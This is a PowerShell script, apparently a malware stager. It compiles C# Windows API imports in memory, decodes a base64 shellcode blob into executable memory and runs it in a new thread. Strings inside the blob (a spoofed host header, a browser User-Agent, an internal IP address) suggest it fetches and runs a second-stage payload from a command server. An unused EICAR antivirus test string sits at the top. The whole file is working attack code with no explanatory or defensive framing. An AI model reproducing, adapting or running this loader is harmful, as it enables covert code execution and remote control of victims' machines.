Set-StrictMode -Version 2

$eicar = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'

$DoIt = @'
$assembly = @"
	using System;
	using System.Runtime.InteropServices;
	namespace inject {
		public class func {
			[Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }
			[Flags] public enum MemoryProtection { ExecuteReadWrite = 0x40 }
			[Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
			[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
			[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
			[DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
		}
	}
"@

$compiler = New-Object Microsoft.CSharp.CSharpCodeProvider
$params = New-Object System.CodeDom.Compiler.CompilerParameters
$params.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))
$params.GenerateInMemory = $True
$result = $compiler.CompileAssemblyFromSource($params, $assembly)

[Byte[]]$var_code = [System.Convert]::FromBase64String("/OiJAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/McCsPGF8Aiwgwc8NAcfi8FJXi1IQi0I8AdCLQHiFwHRKAdBQi0gYi1ggAdPjPEmLNIsB1jH/McCswc8NAcc44HX0A334O30kdeJYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS64ZdaG5ldABod2luaVRoTHcmB//VMf9XV1dXV2g6Vnmn/9XphAAAAFsxyVFRagNRUWgkBQAAU1BoV4mfxv/V63BbMdJSaAACYIRSUlJTUlBo61UuO//VicaDw1Ax/1dXav9TVmgtBhh7/9WFwA+EwwEAADH/hfZ0BIn56wloqsXiXf/VicFoRSFeMf/VMf9XagdRVlBot1fgC//VvwAvAAA5x3S3Mf/pkQEAAOnJAQAA6Iv///8vZjhYZgBiYWlkdS5jb20AYmFpZHUuY29tAGJhaWR1LmNvbQBiYWlkdS5jb20AYmFpZHUuY29tAGJhaWR1LmNvbQBiYWlkdS5jb20AYmFpAFVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDEwLjA7IFdpbmRvd3MgTlQgNi4yOyBXaW42NDsgeDY0OyBUcmlkZW50LzYuMCkNCgBiYWlkdS5jb20AYmFpZHUuY29tAGJhaWR1LmNvbQBiYWlkdS5jb20AYmFpZHUuY29tAGJhaWR1LmNvbQBiYWlkdS5jb20AYmFpZHUuY29tAGJhaWR1LmNvbQBiYWlkdS5jb20AYmFpZHUuY29tAGJhaWR1LmNvbQBiYWlkdS5jb20AYmFpZHUuY29tAGJhaWR1LmNvbQBiYWlkdS5jb20AYmFpZHUuY29tAGJhaWR1LmNvbQBiYWlkdS5jb20AYmFpZHUuY29tAGJhaWR1LmNvbQBiYQBo8LWiVv/VakBoABAAAGgAAEAAV2hYpFPl/9WTuQAAAAAB2VFTiedXaAAgAABTVmgSloni/9WFwHTGiwcBw4XAdeVYw+ip/f//MTkyLjE2OC4xNTQuMTMxAAAAAAA=")

$buffer = [inject.func]::VirtualAlloc(0, $var_code.Length + 1, [inject.func+AllocationType]::Reserve -bOr [inject.func+AllocationType]::Commit, [inject.func+MemoryProtection]::ExecuteReadWrite)
if ([Bool]!$buffer) { 
	$global:result = 3; 
	return 
}
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $buffer, $var_code.Length)
[IntPtr] $thread = [inject.func]::CreateThread(0, 0, $buffer, 0, 0, 0)
if ([Bool]!$thread) {
	$global:result = 7; 
	return 
}
$result2 = [inject.func]::WaitForSingleObject($thread, [inject.func+Time]::Infinite)
'@

If ([IntPtr]::size -eq 8) {
	start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
}
else {
	IEX $DoIt
}
